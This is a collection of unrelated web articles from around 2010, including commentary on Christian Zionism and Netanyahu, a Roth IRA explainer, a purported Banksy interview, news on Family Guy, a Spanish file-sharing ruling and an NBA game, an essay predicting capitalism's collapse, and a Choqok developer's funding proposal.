In his books and sermons Hagee has promoted a “ greater Israel , ” that will reclaim all of Israel ’s former biblical territory , stating “ In modern terms , Israel rightfully owns all of present - day Israel , all of Lebanon , half of Syria , two - thirds of Jordan , all of Iraq , and the northern portion of Saudi Arabia . ”
At the Jerusalem CUFI event Hagee described Ahmadinejad as the Hitler of the Middle East who could turn the world upside down in 24 hours , words similar to those he made when lobbying for the attack on Iraq .
“ Help is not going to come from Washington , it is going to come from God , ” stated Hagee .
In Hagee ’s apocalyptic prophecy media he claims that the rest of the world will turn on Israel in the imminent battles of the end times and that a “ remnant “ of Jews will only convert after being rescued by Jesus and his armies .
“ Lord save your people , the remnant of Israel , ” Hagee repeated three times , and asked the audience to join him in supernaturally shouting the phrase .
Netanyahu , who has long been a favorite of Christian Zionists , received a rousing applause when he welcomed the CUFI audience to Jerusalem , the “ undivided , eternal capital of the Jewish people . ”
He commented that “ the people of the bible are on the land of the bible . ”
Included in the program was a fifteen minute film showing the recipients of 58 million dollars from CUFI and John Hagee Ministries , Inc. since 2001 .
These included Im Tirtzu , Renewal of the Jewish Settlement in Shomron , Friends of Gush Katif , Christian Friends of Israeli Communities , the Community Center of Efrat ( The John and Diana Hagee Lovingkindness Center ) , the settlement of Ariel , and numerous charitable organizations , schools , and hospitals .
Worldwide Biblical Zionists
During a performance by singer Dudu Fisher , the God TV camera panned to the audience and centered on Joel Bell , leader of Worldwide Biblical Zionists .
WBZ is currently building a center in Sha’ar Benjamin for “ facilitating absorption ” of Christian Zionists into the West Bank .
It was established after a joint meeting held in Texas of the Board of Governors of World Likud led by Danny Danon , and World Evangelical Zionists led by Joel Bell .
Speakers included ZOA ’s Morton Klein .
In a recent video showing the progress of the WBZ ’s Strategic Biblical Zionist Center , Joel Bell announces , “ We are coming to you live from our new facility , the headquarters here in Samaria , the heart of Yahweh .
We are in the process of wrapping up a one year construction project where we have been building Zion in opposition to the nations saying ‘ you ca n’t build , no building in the so - called occupied territories . ’
Well , because it is our birthright and because this is where Hashem intended for Jews and Israelis and foreigners who have joined themselves to Yahweh to return back to this area and build , we have chosen to obey Hashem instead of the nations that are raging . ”
In another WBZ video Bell states , “ I ’m working very closely with Bibi now and I will go to America on behalf of the general elections . ”
Bell may have been exaggerating his political ties , but he toured the U.S. with Likud ’s Sagiv Assulin prior to the election .
Members of Netanyahu ’s current cabinet spoke at the WBZ inaugural event on November 16 , 2008 , including the Minister of Public Affairs , Yuli Edelstein , who is quoted in the New York Times as saying that the timing of the housing announcement was not aimed at harming the visit by Biden .
In the WBZ video Bell states , “ If they get forty seats , they will be able to create a center right government that will be able to implement policy based on the covenant and the vision of the restoration of Israel , bringing Judah , Joseph , and Ephraim back … ”
The reference to Ephraim is to Christians who believe they are lost heirs of the house of Israel .
In the 19th and 20th centuries the same Ephraimite terminology was used by British Israelites who believed that they had rights to the Holy Land .
A New Breed of Christian Zionists
Netanyahu is fanning the flames of a millennialist frenzy .
He is no longer dealing with fundamentalists like Jerry Falwell who were somewhat restrained by a theology that limited interference in God ’s timeline .
Today ’s activism has emerged from the Charismatic / Pentecostal stream , and they believe that humans are mandated to move the hands of the prophetic clock .
John Hagee ’s CUFI has served as a transition between the old school fundamentalists and this self - proclaimed “ new breed ” of end times warriors .
Some of Hagee ’s CUFI leaders are part of a particularly aggressive Charismatic missionary movement that is led by people who call themselves “ apostles ” and “ prophets . ”
In their apocalyptic narrative , the prerequisite for the return of Jesus is that Israel must call out to him as messiah , and that worldwide revival will come once Israel is converted .
Their goal of eradicating Rabbinic Judaism is artfully camouflaged in terminology and songs that Charismatic leaders openly use in the company of their Jewish hosts .
These include “ the restoration of the tabernacle of David ” and the “ priesthood of Melchizedek , ” narratives in which Judaism is replaced by worship claimed to be preferred by God .
For instance , the tabernacle of David is considered superior to the liturgical worship in the Temple , and the priesthood of Melchizedek superior to the Levitical priesthood .
Melchizedek is seen as a reference to the coming kingdom of Jesus or even as an appearance of Jesus to Abraham .
Did Prime Minister Benjamin Netanyahu deliberately sabotage the Obama administration ’s attempt to restart peace talks ?

In a repeat of a similar event twelve years ago , the Israeli leader and the American televangelist had again taken preemptive steps to obstruct peace talks .
The Priesthood of Melchizedek
Almost as shocking as the political implications of the event , are the lengths that Jewish leaders will go to maintain the relationship with Christian Zionists .
The invocation was given by Rabbi Shlomo Riskin in which he called Hagee a Kohen and a modern day Melchizedek .
Riskin , who heads Ohr Torah Stone , refers to himself as the founding Chief Rabbi of Efrat , a settlement that has been the scene of confrontations in previous peace negotiations .
Melchizedek is mentioned only briefly in scriptures , but has been a significant figure to groups of Christians throughout history and plays a major role in today ’s Christian Zionism .
Joel Bell describes Ephraimites as having “ been grafted in to the commonwealth of Israel through Melchizedek - Yehoshua HaMashiach . ”
In current Christian Zionist media , the figure of Melchizedek is used in the claim that the priesthood of Jesus can be found in the ancient Hebrew scriptures , and both precedes , as well as supersedes the Levitical priesthood and Rabbinic Judaism .
Examples include sermons by Wayne Hilsden who leads the King of Kings church in Jerusalem , the international epicenter for linking Christian Zionists and Messianics from around the world .
Described as the largest evangelical congregation in Israel , it ’s founders have stated that they immigrated to Israel at the invitation of the Israeli government in 1981 .
Don Esposito , head of the Congregation of YHWH in New Jersey , has also coordinated with Likud ’s Sagiv Assulin and takes tours of Ephraimites to Israel for the annual Feast of Tabernacles .
Esposito uses the Melchizedek narrative in an effort to delegitimize “ modern Rabbinic Judaism , ” claiming that it “ is a false second century religion made up by an evil man named Akiva . ”
Christian Zionism is marketed to the Jewish leaders as rejecting replacement theology .
However , these same millennialists , dancing around in tallitot and blowing shofars , increasingly view themselves as the Israel of the end times .
Their attacks on Talmudic or Pharisaic Judaism as a false religion are become more overt .
The Feast of Tabernacles and the Day of Prayer
The Feast of Tabernacles is celebrated as a “ dress rehearsal ” of the coming Millennial Kingdom , complete with Messianic music productions and Davidic dance .
In 2007 Israel ’s Chief Rabbinate declared the annual event sponsored by the International Christian Embassy of Jerusalem to be off limits to Jews .
However , Rabbi Shlomo Riskin continued to participate .
He spoke at the 2009 event titled “ The Tabernacle of David - The Promised Restoration . ”
In 2009 the celebration happened to overlap the annual Day of Prayer for the Peace of Jerusalem ( DPPJ ) and was also held at the Jerusalem Convention Center and broadcast by God TV .
Founded and chaired by Jack Hayford and CUFI Director Robert Stearns , who sang Hatikvah at last week ’s event , the DPPJ now claims participation of 300,000 churches in 192 nations .
Rabbi Riskin ’s speech at the 2009 DPPJ included a moment of cognitive dissonance , as he stated , “ As we march together it must be with mutual respect .
Neither of us dare have as a raison d’être the conversion of the other … ”
Despite previous blowing of shofars and hearty applause for Riskin , there was silence .
The leaders hosting this international event are well known in the Christian Zionist world as the engine that has powered the explosive Messianic scene in Israel as well as Brazil , Argentina , Russia , the Ukraine and U.S. Riskin had been preceded on stage by Jack Hayford who heads a Messianic seminary that coordinates training around the globe “ to best reveal Yeshua to all Israel . ”
The DPPJ is a thinly veiled international effort to “ bless ” Israel through evangelism and the termination of Rabbinic Judaism as a religion separate from Christianity .
Media materials for the DPPJ have included a book promoting evangelical support for Messianic missions .
Stearns has written that “ more Jewish people have come to faith in Messiah in the last few decades than in all of church history combined . ”
While the events ’ speakers consistently attack anti-Semitism and Israel ’s enemies , it is clear from their media that they consider the most pressing threat from which Jews must be saved to be Rabbinic Judaism .
The Tragedy of Christian Zionism
Netanyahu apparently only sees the immediate political benefits of this wave of Christian millennialism .
But is it possible that Rabbi Riskin does not comprehend the dangers to Judaism ?
Almost two years ago , after Riskin defended Hagee ’s controversial “ Hitler as a hunter sent by God ” sermon , I sent video clips of Hagee ’s Judeophobic rants to one of Riskin ’s assistants .
Others have also reported trying to explain to him the significance of the attacks on Judaism by the Christian Zionists which he so ardently supports .
Riskin argues that his work is crucial to Christian and Jewish relations .
However , one of the great tragedies of Christian Zionism is the damage that the movement has done to interfaith relations , the type with no strings attached .
True interfaith alliances allow Jews to remain as Jews , and Christians to be Christians .
The hybrid that is taking place in the Christian Zionist and Messianic world is an attack on the institutions of both religions , and is flooding Israel with aggressive missionaries who are instigating conflict between Christians and Jews .
Those Christians who are not obsessed with Jews as supernatural pawns of the end times are not likely to be Christian Zionist activists .
Sadly many of the Christians most tolerant of Jews and Judaism have been unfairly targeted as anti-Semitic for their rejection of biblical Zionism as the basis for political policy .
Many Christians who feel a kinship with Israel desire a human peace for the nation , not a world governed by interpretations of apocalyptic prophecy .
In reference to Rabbi Riskin , Leonard Fein made this point , “ If the issue between Israel and its neighbors comes down to one people ’s bible against another ’s , then the end is inevitably about which people has the power to enforce its bible . ”
The other great tragedy of Christian Zionism is the role that it has played in obstructing peace negotiations in the Middle East , a process which might actually secure Israel ’s future .
The CUFI event on Monday has received almost no publicity in the mainstream press .
However , one minister summed up Netanyahu ’s performance with the following telling words :
“ Benjamin Netanyahu now has the dubious distinction of being the only Israeli leader to ever salute a man who makes money from biblical prophecies suggesting Israel ’s imminent destruction while simultaneously humiliating the leaders of the very country he relies on for its protection . ”
In today 's uncertain times , everyone is looking for a guarantor of their future .
The best idea , however , is not to bet your future on one specific source , but on multiple nest eggs which can be drawn upon to contribute toward that happy moment when you will no longer need to work .
As we have seen , companies can fall , and their retirement plans can come crashing down with them .
Investing in a Roth - type IRA is a surefire way of adding a nest egg to your investment mix .
What is a Roth IRA ?
A Roth is a TAXABLE individual retirement account .
This is the most unique attribute of a Roth IRA versus other traditional investments : the money you invest ( or " contribute " ) is taxed before it enters the Roth account .
At first , as your account is mostly full of money you contributed , the difference sounds merely semantic .
As your account grows , however , increasing amounts of it begin to come from earnings .
It is important to realize that only the contributions are taxed , not the earnings !
So , when you decide to withdraw money from your Roth account and retire with it , you are not taxed .
Aside from the large quantity of money which never was taxed , you have also paid your taxes up front .
This is important because taxes are not likely to drop , so getting them out of the way early is most beneficial for you .
How much could I possibly earn from my Roth IRA ?
Let 's say you were in college for the first four or five years after high school , and you were unable to sock any money away .
So , you are now 23 with a full time job , and you want to put some of your money in an IRA .
If you put half of the maximum contribution ( currently $ 5000 a year until 50 , then $ 6000 until 60 with some differences for income ) away until age 60 , and you expect to earn a conservative rate of 4 % , you will have $ 218,669 by the age of 60 .
Over this period of time , you contributed $ 97,500 , and earned $ 121,169 , more than doubling your money !
The sooner you begin investing and the more you invest , the bigger a nest egg that you can maintain .
This year 's maximum contribution for the Roth IRA is $ 5000 ( fiscal year 2010 ) .
One final advantage of the Roth - type IRA is that you are not required to begin withdrawing from it at any age .
Therefore , the money can be tax free inheritance money or simply security money for later .
Most other long - term investments do require payouts at the end of the investment period ( typically age 70 and 1/2 ) .
How do I get started ?
This is the easy part .
Most banks have financial advisors in their local branches which will help you decide what type of long - term investment is right for you .
They can walk you through the advantages of various investments in 30 minutes to an hour .
Some types of investments require a minimum initial amount to start ; a Roth IRA does not .
The most important thing to remember when investing for your future is that while it may never be too late to invest , it is best to start as early as possible .
The Roth - Type IRA offers a no-frills method of securing financial freedom with little nail - biting or thought .

The Contradiction of Contradiction : A Conversation with Banksy
“ The thing I hate most about advertising is that it attracts all the young , bright , creative people , leaving us with only the slow and self - obsessed to become our artists .
Modern art is a disaster area .
Never in human history has so much been used by so many to say so little . ”
– Banksy
For those who do n’t know Banksy ’s work , he is a graffiti artist , and so much more .
He is an anti-hero , the working class ’s comic messenger .
His images are a response to one - sided conversations , screaming back at the forces he feels scream at us .
His aim is to offer free art to the every - man , or , at the very least , bring a smile to the downtrodden middle - class commuters , those who work in an office box , shuffling papers , who go home to microwave dinners and bad TV crime dramas , sleep alone and repeat the process .
For them , he traipses on bridge ledges and city rooftops at night , giving them a voice of dissent and making them laugh at the same time .
Yet , as Banksy ’s images have grown famous , the subject of his work can be seen as a topic of potential contradiction .
When Angelina Jolie drops close to half a million on your art show ’s opening night in an obscure Los Angeles warehouse , and in London you ’re represented at Sotheby ’s auction house at their Contemporary Evening Sale ( the Holy Grail for a living artist ) , how does someone whose reputation was built on being a street urchin graffiti artist maintain integrity ?
In April 2009 , I was fortunate enough to have a brief telephone conversation with Banksy .
A friend of mine who runs a New York and Los Angeles gallery dubbed in the press as “ alternative ” put me through to him .
Banksy would speak to me only on the condition that the call go through the gallery .
Even though I trusted my friend , I was dubious that I would get the real Banksy .
In the past , English weeklies like NME ( New Music Express , a paper showcasing contemporary Britpop ) or glossy magazines like The Face have had two hour interviews with someone claiming to be the elusive street artist allegedly from Bristol , only to eventually discover they were actually talking to Q - Bert from Leeds or the tagger Spilly from Liverpool .
I was pretty sure I got the right guy , though , when during the three - way conversation my gallery friend accidentally referred to Banksy by his birth name and Banksy became severely irate .
“ You fookin ’ ping - pong piddly tosser ! ” he said .
“ Think man , Think !
Use yer fookin’ melon ! ”
I asked Banksy what he thought about his work being bought up en masse by the likes of Brad Pitt , and after a pause he said , “ Nahh , it ’s alright , I liked Fight Club . ”
And said he had no problem with sales to celebrities , as they generally can afford premium sums , and that gets him back on the road .
Banksy is not building a nest egg per se to get a big country house ; the lion ’s share of his earnings from original paintings , prints , and stencil works go to his true passion : creating outdoor street art .
Money allows him to travel to cultural hot spots that he feels could use a visual face - lift , such as post - hurricane Katrina New Orleans , the Barcelona Zoo , or the segregation wall separating Palestine from Israel .
Banksy says his greatest fear was being picked up by Iraqi - born advertising mogul Charles Saatchi .
Mr. Saatchi formed an advertising firm that was the largest in the world for over a decade , and has built up a massive collection of modern and contemporary British art .
Banksy referred to him as a sham of a collector who pretends to benefit young British artists ( dubbed ‘ YBA ’s ) , and is nothing more than a “ moneyed twat . ”
The root of his loathing is the fact Saatchi is an incredibly successful advertiser .
Banksy feels the real visual poison , the true defacement of urban areas or neighborhoods is not executed by graffiti artists , rather large corporations that thrust their products upon you unsolicited , via billboards , television , etc .
That these are one - way conversations where organizations use media to make the average public viewer feel insignificant without possessing their products , feeding on feelings such as the smugness an Escalade owner gets at a red light looking to the Ford Focus in the next lane .
At the same time , he feels that art galleries and museums are no different .
He dubs modern art “ a disaster area . ”
In the art world there are essentially two schools of thought about representational works : that presenting an image realistically is a talented shortcut to thinking , or that abstract art is for those who ca n’t draw .
There ’s also the separation of high and low art ; graffiti versus oil painting , for example , and very few have crossed the barriers .
Banksy , however , is one of those few .
Still , he believes that contemporary art galleries distance themselves from the everyday “ ill - arterate ” viewer , and that there is a feeling when you come off the street into a gallery with a quaffed model - ish receptionist , if you ’re to be at all a somebody , you had better understand the current jargon that goeas along with what you ’re looking at , and he is disgusted with this notion .
In the 2005 collection of his work Wall and Piece , Banksy writes :
Art is not like other culture because its success is not made by its audience .
The public fill concert halls and cinemas every day , we read novels by the millions and buy records by the billions .
We the people , affect the making and the quality of most of our culture , but not our art .
The Art we look at is made by only a select few .
A small group create , promote , purchase , exhibit and decide the success of Art .
Only a few hundred people in the world have any real say .
When you go to an Art gallery you are simply a tourist looking at the trophy cabinet of a few millionaires .
So in March of 2005 , Banksy entered the museum world — literally .
Disguised in beard and hat , he hung his own parodied works in four New York museums as surreptitiously as he would paint a bridge .
Often in museum - appropriate gilded frames , his exquisitely altered pieces lasted in public view for various amounts of time ranging from 2 hours to twelve days .
One piece , a faux primitive drawing on stone accompanied by a didactic panel noting its origins from the “ Post - Catatonic Era ” is now in the permanent collection of the British Museum in London .
His anonymity could be considered a Robin Hood sensibility ; while it makes perfect sense to remain veritably unknown for legal reasons , it adds to the romanticism surrounding this person known as Banksy .
I mused about this , wondering what , with his success and skyrocketing fame , an officer of the law would do today seeing Banksy putting up a piece in the middle of the night .
Would he make the arrest and expose a national icon ?
Move on for the sake of the arts ?
Or keep moving and come back at dawn with a chisel , and sell the piece at auction ?
In one case , in February of 2007 , the owners of a house in Bristol with a Banksy mural on an outside wall refused an offer because the potential buyers might remove the mural .
The owners withdrew the original sale description and changed the market listing to “ A Banksy mural with a house attached to it . ”
Debating whether Banksy would be charged today as a criminal if revealed to the general public , I asked an obvious question :
Had he ever been arrested ?
“ Yes , ” he said .
“ Multiple times . ”
Apparently , in the early 1990 ’s , he used to be the bane of Bristol .
Beyond being wanted by the local Constable , he was on file with Scotland Yard , an acknowledgment not generally given to street artists .
But now that he ’s reached financial success , he said , spotters can help him elude police , whereas in the early days when he was alone or with just a few friends , he would have to use creative methods of not being identified as Banksy if he was caught by the police .
Since he was equated with a certain style of stencil works on walls , he would have an alternate backpack stashed away from where he was working that he could switch in a foot pursuit .
This second backpack would be filled with stencils that looked like they were cut out by “ an alcoholic with Down ’s syndrome . ”
So if he were taken to the police station with his materials from the second pack , he’d be booked as a pathetic kid , a wannabe of his notorious pseudonym .
I asked if he was ever planning on revealing himself .
“ No , ” he said .
“ Absolutely not .
Never if I can help it . ”
I went on to say that was mighty virtuous of him to stay away from the limelight .
He said virtue had little to do with it , he knows a lot of street artists look up to him , and he ’d “ hate for them to find out he was just a scrawny guy with shitty teeth . ”
I told him a sociology professor of mine told me the most important thing a citizen can do is to participate in their society , and asked him if he thought that was what he was doing .
He said , “ Yeah , I participate in society , I just happen to do it in dark clothing at 3:30 in the morning . ”
Opinion seems genuinely irrelevant to him as he is , like all great artists , primarily concerned with the process over the outcome of his work .
The planning to climb through a drain pipe or along a thin bridge ledge above a highway is as much a part of the work as the finished image .
That his work is now embraced by the celebrity class and the self - important high art world , as well as the middle - class everybodies , has more to do with faulty assertions that art should fall into current fad - like definitions than it does any ideological contradiction .
On his reputation , Banksy has been quoted as saying , “ People either love me or they hate me , or they do n’t really care . ”
And , really , is n’t that the sum of any passionate endeavor ?

It was the half - sentence of dialogue heard ' round the world .
If you missed " Family Guy " on Sunday , chances are you still know what we are talking about because Sarah Palin has made it hard to miss .
The episode featured the dim - witted Chris going on a date with a young woman with Down syndrome , who refers to herself as the daughter of " the former governor of Alaska . "
Palin 's son , Trig , has Down syndrome .
Palin took to her Facebook page to protest " Fox Hollywood , " her term of endearment for the broadcast network — not to be mistaken with cable network Fox News , where she currently works as a paid commentator .
" People are asking me to comment on yesterday ’s
Fox show that felt like another kick in the gut , " she wrote .
" Bristol was one who asked what I thought of the show that mocked her baby brother , Trig ( and / or others with special needs ) , in an episode yesterday .
Instead of answering , I asked her what she thought .
Here is her conscientious reply , which is a much more restrained and gracious statement than I want to make about an issue that begs the question , ' When is enough , enough ? '" She then pasted her daughter 's reply : “ When you ’re the son or daughter of a public figure , you have to develop thick skin .
My siblings and I all have that , but insults directed at our youngest brother hurt too much for us to remain silent .
People with special needs face challenges that many of us will never confront , and yet they are some of the kindest and most loving people you ’ll ever meet .
Their lives are difficult enough as it is , so why would anyone want to make their lives more difficult by mocking them ?
As a culture , should n’t we be more compassionate to innocent people – especially those who are less fortunate ?
Should n’t we be willing to say that some things just are not funny ?
Are there any limits to what some people will do or say in regards to my little brother or others in the special needs community ?
If the writers of a particularly pathetic cartoon show thought they were being clever in mocking my brother and my family yesterday , they failed .
All they proved is that they ’re heartless jerks .
" The Times asked " Family Guy " creator Seth MacFarlane for an interview regarding the matter .
But he opted to send a statement via his publicist : " From its inception , ' Family Guy ' has used biting satire as the foundation of its humor .
The show is an " equal - opportunity offender .
" Perhaps he was concerned his reply would be longer than the scene in question .

Part 1 : History lessons
The fable behind the stereotype
Global capitalism tipping towards collapse ?
“ C’mon ” , goes the standard response , “ do n’t you know that ’s been predicted for ages and it ’s never happened ? ”
That standard response is reinforced by the mass media ’s visual cliché of some crazed guy , usually wearing a monk ’s cassock , preaching the Apocalyptic message : “ Beware !
The end is nigh ! ”
Behind this sneering stereotype lurk denials that global capitalism could suffer the same fate as all past civilisations .
Early capitalism grew amidst the slow - motion collapse of medieval Europe [ 3 ] which , after lasting for a millennium , was being overwhelmed by market forces .
Feudalism ’s forerunner , the ancient slave - based epoch , lasted 4000 years until the Western Roman Empire [ 4 ] fell quickly in 476 after several centuries of internal decay and border wars .
Before perishing , past civilisations spawned fables about their everlasting nature .
Those fables gave popular legitimacy to societies divided by class , gender , ethnicity , nationality and religion .
The tradition of ages is continued by capitalism .
According to its ideologues , “ flexibility ” is so embedded in capitalism that collapse becomes impossible .
Yet such claims fly in the face of history .
We need to do our own thinking so that our minds cannot be colonised by anyone ’s fables .
Wild times of late feudalism
In the late Middle Ages , Europe ’s land - based hierarchies were disintegrating under pressure from unstoppable market forces .
Feudal society was collapsing before capitalism had solidified into a new type of civilisation . [ 5 ]
The dieback of half Europe ’s population from famines , pandemics and wars [ 6 ] gave life to the independence of landed serfs from their feudal masters .
A swing from subsistence agriculture to farming for profit led to the enclosure of peasant commons .
The growth of urban populations disconnected from feudal land relations was nurtured by industrial production and invention .
An expansion of trade , money , credit and markets , fueled by colonisation of the New World , saw the rise of a capitalist class increasingly conscious of its own “ manifest destiny ” .
A scientific , educational and cultural Renaissance [ 7 ] fed into the Great Schism within Christianity , eroding Papal hegemony [ 8 ] .
The rapid increase in the ranks of wage workers coincided with an explosion of popular uprisings across Europe [ 9 ] and the rise of absolute monarchies , all diminishing feudalism ’s nobility and church .
From these wild times grew new productive forces which gave birth to new social forces , collapsing late feudalism ’s mode of production and hierarchy of privilege in the midst of chaos , wars and uprisings .
From our vantage point five centuries on , we know that medieval civilisation could never have survived these multiple crises as they converged into a perfect storm [ 10 ] .
Near the end of the Middle Ages , however , hardly anyone was calling for the creation of a capitalist world .
It just happened out of a volatile mix of economic revolution , social combustion and historical accident .
Complex and random
Today , our ability to interpret world trends is exponentially greater than in the Middle Ages .
So is our need to do so , given the potential for catastrophes like sea level rises , global hunger and war without end .
Despite our ability and our need to do serious forecasting , we must avoid the trap of downplaying the unknowable effects of random events and dynamic complexity .
“ Events buck trends ” , says British historian Piers Brendon [ 11 ] .
“ The past is a map , not a compass . ”
Still , he admits , “ history is our only guide ” . [ 12 ]
Random events , those happenings that nobody could foresee , always have a huge impact on historical outcomes .
Let ’s be warned by a church in the Unites States , whose electronic billboard declared : “ [ Our ] class on prophecy has been cancelled due to unforeseen circumstances . ” [ 13 ]
Unstoppable forces leave large footprints whose direction we can see .
Yet it is impossible to predict what historical outcomes might be produced by the infinite number of possible interactions of systemic crises and human actors and random events .
This dynamic complexity would fool even a deterministic god .
Global capitalism is easily the most complex social system in history .
This mega - complexity increases the likelihood of system failures , like the international financial implosion of 2008 . [ 14 ]
But there ’s a flip side to complexity .
It offers multiple layers of protection against a system failure leading onto system collapse .
The financial implosion , therefore , sparked a multi-state mobilisation to ward off immediate world economic collapse . [ 15 ]
Convergence of five existential crises
Even the in - depth defence offered by layers of complexity could not protect capitalism from a convergence of existential crises [ 16 ] which overwhelm multiple fronts of the world system .
Such a perfect storm is now gathering force .
Jorge Benstein , a Marxist economist in Argentina , points to the historic intersection of economic , food , energy and other “ visible crises ” which could strike the world system at any time .
He concludes : “ We are facing the convergence of numerous crises which in reality is one global gigantic crisis with different faces , never seen before in history . ” [ 17 ]
During the 20th century , capitalism was destabilised by occasional intersections of just two system - level social crises .
Examples include the imperial and legitimacy crises flowing from both world wars , and the Great Depression ’s profitability and legitimacy crises .
Today , for the first time since its birth 500 years ago , global capitalism is facing the convergence of five system - level crises embracing nature as well as society :
profitability crisis
ecological crisis
resource crisis
imperial crisis
legitimacy crisis .
As these five crises converge into a perfect storm they will tip global capitalism towards collapse amidst international revolutions and counter - revolutions .
We cannot foresee what type of new civilisation (s ) will result from the unpredictably complex interactions of human actors with economic , ecological and imperial shifts .
But a perfect storm overwhelmed late feudalism , and there seems no reason to expect that late capitalism ’s fate will be any different .
Given its global interconnectivity and the life - threatening scale of its problems , capitalism is likely to fall at speed compared to feudalism ’s slow - motion collapse .

After early calls to shut down a Spanish file - sharing site were dismissed , music group SGAE pinned its hopes on success at the full trial .
But , the outcome for them was nothing short of a disaster .
The judge declared that both non-commercial file - sharing link sites and non-profit use of P2P networks are legal in Spain .
Despite many rulings which have declared file - sharing sites legal if they do n’t profit directly from copyright infringements , in recent years its become something of a custom in Spain for music rights groups to attempt to close down sites in advance of a full hearing to assess their legality .
One such case involves eDonkey link site elrincondejesus.com and although fairly low profile worldwide , the site will now start to set headlines .
Back in May last year , site and bar owner Jesus Guerra received a complaint from music group SGAE ( Sociedad General de Autores y Editores ) which alleged the site abused the copyrights of its members .
In a June court appearance , SGAE hoped to get an early injunction to shut Elrincondejesus immediately in advance of a full hearing which would happen at a later date .
Guerra protested that his site is legal , carries no advertising and simply provides links like any other search engine .
Judge Raul N. García
Orejudo threw out the request for an immediate closure of the site in July , declaring : “ P2P networks , as a mere transmission of data between Internet users , do not violate , in principle , any right protected by Intellectual Property Law . ”
Now the full case has been heard and the outcome is nothing short of a disaster for SGAE .
In order to assess if there had been a breach of Spain ’s Intellectual Property Act , the court had to decide if simply providing links to copyrighted works was the same as making those works available to the public .
Judge Raul N. García
Orejudo decided that offering an index of links and / or linking to copyright material is not the same as distribution and noted that under current law there is nothing which prohibits such sites from operating .
In making his decision the judge also looked at the finances of the site .
He said the site was not a business since the operator of Elrincondejesus made no direct or indirect profits from its operation .
Apparently on a roll after confirming non-profit file - sharing sites are legal , he gave users of those sites a nice surprise too .
“ P2P networks are mere conduits for the transmission of data between Internet users , and on this basis they do not infringe rights protected by Intellectual Property laws , ” he declared .
Therefore , if an individual uses P2P networks like eDonkey or BitTorrent to obtain copyright material for non-profit reasons , the act is completely legal .
The outcome of this case is such bad news for SGAE it ’s expected they will appeal the decision .
Or get the law changed .
Or both .
PHOENIX --
It 's an NBA law of physics :
Put the highest - scoring team in the league against arguably the worst defense and watch the scoreboard light up like the Fourth of July .
Jason Richardson scored 27 points and Amare Stoudemire 25 , then sat with the rest of the Phoenix starters while the Suns ' reserves finished off a 152 - 114 rout of Minnesota on Monday night in the highest - scoring game by an NBA team this season .
Lou Amundson matched his career high with 20 points as Phoenix sent the Timberwolves to their 10th straight loss and 16th in the last 17 games .
The Suns , with eight players in double figures , shot 56 percent from the field and 15 of 31 from 3 - point range to win their ninth in 12 games .
" We 're just trying to gear up for the last 15 games , " Phoenix coach Alvin Gentry said , " have a pace that we 're comfortable with . "
Corey Brewer scored 21 for the Timberwolves , who set a franchise record for most points allowed in a game .
" Well , that 's certainly what happens when you do n't play any defense , " Timberwolves coach Kurt Rambis said .
Phoenix pulled alone into sixth place in the tight scramble for playoff positioning in the West .
The Suns trail No. 5 Oklahoma City by a half - game and No. 4 Utah by 1 1/2 games .
It was a perfect night to rest the starters in preparation for Friday night 's home game against the Jazz .
" And you know that will be a physical game , " Gentry said .
This one certainly was n't .
" It was a lot of fun , " Stoudemire said .
" It was so much fun when the starters were able to rest there in the fourth .
We 'll take that . "
Richardson , who scored 15 in the first quarter , matched his season high with six 3 - pointers .
Steve Nash had 13 points and 14 assists , nine of them in the opening period .
The game matched two of the bottom three teams in terms of points allowed this season .
The difference was the Suns have a lot more scorers than woeful Minnesota does .
" We were n't making that effort .
They were playing a lot harder than we were , " Rambis said .
" With a team that is in synch the way that they 're in , they understand how to move the basketball , the know where their options and their outlet passes are .
They 're just too good . "
It was not the first time this kind of thing happened to Minnesota .
The Timberwolves had matched a franchise record by giving up 146 points in a 41 - point loss to Golden State last Nov. 9 .
" It 's just embarrassing to let a team score that many points and still lose by that many points , " Minnesota 's Ryan Gomes said .
The Suns overwhelmed the Timberwolves ' ever - shaky defense to take a 79 - 61 halftime lead .
It was the second - most points scored in a half in the NBA this season , eclipsed only by the 80 - point second half for Milwaukee against Golden State on Nov. 14 .
Phoenix had n't scored this many in a half since getting 80 in the second half in its 154 - point game at Golden State almost exactly a year ago , on March 15 , 2009 .
The Suns shot 67 percent in the first half ( 33 of 49 ) , led by Richardson 's 21 points , including 5 of 6 3 - pointers .
Nash had 11 points on 5 - of - 6 shooting and 11 assists in the first half .
Richardson made two 3s and Nash one in the final two minutes of the half as the Suns twice built a 20 - point lead before Jonny Flynn 's baseline jumper at the buzzer made it 79 - 61 .
The lead reached 29 in the third quarter and a whopping 41 in the fourth .
Leandro Barbosa returned to the Suns after undergoing surgery to remove a cyst in his right wrist and missing 23 games .
He had seven points in 16 minutes .
Game notes
The Timberwolves have given up 120 or more points 14 times this season .
...
The Suns guaranteed their sixth consecutive winning season .
...
Brewer had a powerhouse dunk over 7 - footer Robin Lopez in the second quarter .
...
Phoenix got its fourth 70 - point half of the season .
... The Suns' Grant
Hill showed no ill effects from banging the back of his head on the court in Saturday 's win over New Orleans .

As you heard before , I ’m doing military service and it ’s some kind of non-profit job right now :-/
Recently I ’ve noticed that i have to do some jobs to earn money .
But this way will take most of my free time , and there could n’t be time to do My favorite job , i.e. working on Choqok and Blogilo .
Some days ago , An idea came in my mind , I discussed with some close friends about if this idea could work , and now I want to talk with you about it .
The idea is some kind of sponsoring Choqok development by it ’s users :
There are so many features we can implement !
from new microblog services ( like friendfeed ) to additional useful automatic tasks ( like translation of dents / tweets )
We define some kind of minimum donation requirement to implement one special feature / idea .
And then users who want to have that feature sooner , and like to participate in its development , will decide to donate some amount of donation required to implement it ( Whatever that is important to them ) !
And then , After donation for that idea reaches the min , I ’ll notice you , and will work on it !
This way , Choqok development speed can increase much more , and I wo n’t need to give up working on it and do another job .
It ’s mostly about Choqok right now , but can be applied to Blogilo if there ’s interest about it .
and to any other KDE app later , if it works ! ;)
Now ,
How we can implement it !?
Well ,
The simplest way I think ( I ’m not a web dev ; ) ) is running a forum , and discussing about them there !
and in donation page users can add comment , and there ’s a good place to mention that this donation would be to contribute on which feature !
We can make it more automatic later …
What do you think about the whole idea !?
Do you have any idea about the implementation way ?

Topless Robot Podcast : # 103 – Call Me When You Can Shred The Gnar , Poser
The Israeli defence ministry today authorised further construction in a Jewish settlement on the occupied West Bank .
The decision came prior to the arrival in Israel of the US vice - president , Joe Biden , who is expected to announce a new round of indirect peace talks .
Approval for 112 new flats in Beitar Illit , an ultra-Orthodox settlement near Bethlehem , was given despite a 10 - month partial curb on settlement construction announced by the Israeli government under heavy US pressure in November .
The decision to approve the building work appeared to be an attempt to appease members of Israel 's rightwing coalition government .
